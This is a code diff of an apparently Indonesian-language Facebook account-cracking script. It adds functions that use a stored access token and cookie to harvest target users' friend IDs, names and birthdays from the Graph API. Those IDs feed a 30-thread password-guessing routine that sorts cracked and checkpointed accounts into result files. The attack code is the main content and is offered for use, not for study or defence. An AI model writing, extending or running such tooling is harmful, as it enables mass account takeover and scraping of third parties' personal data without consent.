@@ -392,15 +392,13 @@ def login_menu():
         massal()
     elif ___Sllowly_ID____ in ['2']:
 	    prints(nel(f'                         [bold blue]Publik Crack')) 
-	    idt = input('✶ ━━⫸ {H} ID Target{N} : ')
-	    dump(idt,"",{"Kue":cok},token)
-	    setting()
+	    dump2()
     elif ___Sllowly_ID____ in ['3']:
 	    mail2()
     elif ___Sllowly_ID____ in ['4']:
 	    result()
     elif ___Sllowly_ID____ in ['5']:
-	    file()
+	    crack_file()
     elif ___Sllowly_ID____ in ['0']:
 	    os.system('rm -rf .token.txt')
 	    os.system('rm -rf .Kue.txt')
@@ -447,8 +445,25 @@ def dump(idt,fields,cookie,token):
 			sys.stdout.flush()
 		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
 	except:pass
+#-------------------[ CRACK-PUBLIK ]----------------#
+def dump2():
+	with requests.Session() as ses:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+		a = input(f'✶ ━━⫸ {H2} ID Target{x} : ')
+		try:
+			params = {
+			"access_token": token, 
+			"fields": "name,friends.fields(id,name,birthday)"
+			}
+			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
+			for c in b["friends"]["data"]:
+				id.append(c["id"]+"|"+c["name"])
+			print(' : {}'.format(len(id)));setting()
+		except Exception as e:
+			print(e)
 #-----------------[ CRACK EMAIL ]-----------------#
-def mail2():
+def mail1():
 	dump=[]
 	rc = random.choice
 	rr = random.randint
@@ -477,6 +492,60 @@ def mail2():
 		time.sleep(0.0000003)
 	print("\r")
 	setting()
+#-----------------[ CRACK EMAIL2 ]-----------------#
+def mail2():
+    try:
+        token = open(".token.txt", "r").read()
+        cok = open(".cok.txt", "r").read()
+    except IOError:
+        exit()
+    try:
+        kumpulkan = int(input(f">> {H}Mau Berapa Id?{N} : "))
+    except ValueError:
+        exit()
+    if kumpulkan < 1 or kumpulkan > 1000:
+        exit()
+    ses = requests.Session()
+    bilangan = 0
+    for KOTG49H in range(kumpulkan):
+        bilangan += 1
+        Masukan = input(f">> {H}Masukkan Id Yang Ke {N}" + str(bilangan) + f" : ")
+        uid.append(Masukan)
+    for user in uid:
+        try:
+            head = {
+                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
+            }
+            if len(id) == 0:
+                params = {"access_token": token, "fields": "friends"}
+            else:
+                params = {"access_token": token, "fields": "friends"}
+            url = requests.get(
+                "https://graph.facebook.com/{}".format(user),
+                params=params,
+                headers=head,
+                cookies={"cookies": cok},
+            ).json()
+            for xr in url["friends"]["data"]:
+                try:
+                    woy = xr["id"] + "|" + xr["name"]
+                    if woy in id:
+                        pass
+                    else:
+                        id.append(woy)
+                except:
+                    continue
+        except (KeyError, IOError):
+            pass
+        except requests.exceptions.ConnectionError:
+            exit()
+    try:
+        print(" : " + str(len(id)))
+        setting()
+    except requests.exceptions.ConnectionError:
+        exit()
+    except (KeyError, IOError):
+        exit()
 #-----------------[ CRACK FILE ]-----------------#
 def crack_file():
 	try:vin = os.listdir('/sdcard/downloads/')
@@ -518,13 +587,13 @@ def crack_file():
 		setting()
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	clear()
 	loading()
 	clear()
 	banner()
+	print(nel(" "* spasi_awal + pesan_selamat))
 	print(f'[01] [white]Hasil [green]OK [white]Anda ')
 	print(f'[02] [white]Hasil [yellow]CP [white]Anda ')
-	kz = input(f' {H2}╰─▶{B2} ✶{N} {H} Pilih : ')
+	kz = input(f' {H}╰─▶{B} ✶{N} {H} Pilih : ')
 	if kz in ['02','2']:
 		
 		try:vin = os.listdir('CP')
@@ -547,11 +616,11 @@ def result():
 					nom = ''+str(cih)
 					lol.update({str(cih):str(isi)})
 					lol.update({nom:str(isi)})
-					print(f'[0%s] %s {K}%s {x}Account'%(nom,isi,len(hem)))
+					print(f'[0%s] %s {K}%s Account'%(nom,isi,len(hem)))
 				else:
 					lol.update({str(cih):str(isi)})
-					print('['+str(cih)+'] '+isi+f' {K}'+str(len(hem))+f' {x}Account'+x)
-			geeh = input(f' {H2}╰─▶{B2} ✶{N} {H} Pilih : ')
+					print('['+str(cih)+'] '+isi+f' {K}'+str(len(hem))+f' Account'+x)
+			geeh = input(f' {H}╰─▶{B} ✶{N} {H} Pilih : ')
 			
 			try:geh = lol[geeh]
 			except KeyError:
@@ -568,7 +637,7 @@ def result():
 				print(f'{x} {h}╰─▶{x}{K}{cpkuni[0]}{P}│{K}{cpkuni[1]}')
 				nocp +=1
 			
-			input(f'{x}[{m} Klik Enter{x} ]')
+			input(f'{x}[{m} Klik Enter Untuk Kembali Kemenu{x} ]')
 			back()
 	elif kz in ['01','1']:
 		
@@ -592,11 +661,11 @@ def result():
 					nom = '0'+str(cih)
 					lol.update({str(cih):str(isi)})
 					lol.update({nom:str(isi)})
-					print(f'[%s] %s {H}%s{x} Account'%(nom,isi,len(hem)))
+					print(f'[%s] %s {H}%s Account'%(nom,isi,len(hem)))
 				else:
 					lol.update({str(cih):str(isi)})
-					print(f'[%s] %s {H} %s {x}Account'%(cih,isi,(len(hem))))
-			geeh = input(f' {H2}╰─▶{B2} ✶{N} {H} Pilih : ')
+					print(f'[%s] %s {H} %s Account'%(cih,isi,(len(hem))))
+			geeh = input(f' {H}╰─▶{B} ✶{N} {H} Pilih : ')
 			
 			try:geh = lol[geeh]
 			except KeyError:
@@ -612,7 +681,7 @@ def result():
 				cpkuni=lin[nocp].split('|')
 				print(f'{x} {h}╰─▶{x}{h}{cpkuni[0]}{P}│{H}{cpkuni[1]}{P}│{h}{cpkuni[2]}{x}')
 				nocp +=1		
-			input(f'{x}[{m} Klik Enter{x} ]')
+			input(f'{x}[{m} Klik Enter Untuk Kembali Kemenu{x} ]')
 			back()
 	elif kz in ['3']:
 		back()
@@ -670,7 +739,7 @@ def massal():
 	    except requests.exceptions.ConnectionError:
 	        exit()
 	try:
-	      print("╰─▶ [bold purple]Total DUMP{N}  : "+str(len(id))) 
+	      print("[bold green]╰─▶ [bold purple]Total DUMP  :{asu} "+str(len(id))) 
 	      setting()
 	except requests.exceptions.ConnectionError:
 	    exit()
@@ -753,8 +822,8 @@ def passwrd():
 	loading()
 	clear()
 	banner()
-	prints(nel(f'                !{H} PROSES CRACK SEDANG BERLANGSUNG{N} !'))
-	prints(nel(f'               !{H} ON/OFF MODE PESAWAT SEBELUM MULAI{N} !')) 
+	print(nel(f'                !{H} PROSES CRACK SEDANG BERLANGSUNG{N} !'))
+	print(nel(f'               !{H} ON/OFF MODE PESAWAT SEBELUM MULAI{N} !')) 
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -797,17 +866,8 @@ def passwrd():
 	cetak(nel('\t[cyan][green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
 	print(f'[•]{K2} CP : {K2}%s '%(cp))
-	print('')
-	print('>> Ketik "crack" untuk crack lagi ')
-	woi = input('>> ketik : ')
-	if woi in ['crack','Crack','CRACK']:
-		print(f'\t>> Jangan lupa pilih prabowo << ')
-		time.sleep(2)
-		back()
-	else:
-		print(f'\t>> Jangan lupa pilih prabowo << ')
-		time.sleep(2)
-		exit()
+	input(f'{x} Klik "{m}Enter{x}" Untuk Kembali Kemenu{x} ]')
+	back()
 #--------------------[ METODE VALIDATE ]-----------------#
 def validate1(idf,pwv):
 	global loop,ok,cp
